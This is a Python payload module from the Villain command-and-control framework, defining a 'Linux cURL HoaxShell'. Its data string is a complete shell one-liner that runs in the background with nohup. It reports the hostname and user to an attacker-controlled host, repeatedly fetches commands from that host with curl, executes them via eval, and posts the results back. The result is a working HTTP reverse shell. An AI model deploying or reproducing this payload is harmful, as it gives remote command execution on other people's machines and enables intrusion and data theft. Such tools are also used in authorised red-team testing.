# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Linux cURL HoaxShell',
        'Author' : 'Panagiotis Chartas (t3l3machus)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/t3l3machus/hoaxshell', 'https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'hoaxshell',
        'type' : 'sh-curl-ssl',
        'os' : 'linux',
        'shell' : 'unix'
    }

    config: ClassVar[dict] = {
        'frequency' : 0.8
    }

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = 'nohup `s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/*GETCMD*" -H "*HOAXID*: $i" 2>/dev/null);if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r" 2>/dev/null; fi; fi; sleep *FREQ*; done;` &'
